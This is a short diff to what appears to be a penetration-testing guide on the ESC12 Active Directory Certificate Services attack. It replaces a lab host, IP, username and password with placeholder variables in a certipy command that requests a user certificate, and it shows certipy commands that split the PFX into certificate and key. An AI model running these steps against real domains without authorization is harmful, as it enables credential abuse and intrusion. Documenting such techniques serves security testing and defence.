@@ -131,7 +131,7 @@ At the time of writing, no solution exists to perform this attack from a UNIX-li
 
 Retrieve a valid certificate  :
 ```powershell
-certipy req -target dc-esc.esc.local -dc-ip 10.10.10.10 -u "user_esc12@esc.local" -p 'P@ssw0rd' -template User -ca <CA-Common-Name>
+certipy req -target $ADCS_HOST -dc-ip $DC_IP -u "$USER@$DOMAIN" -p '$PASSWORD' -template User -ca <CA-Common-Name>
 certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
 certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
 ```
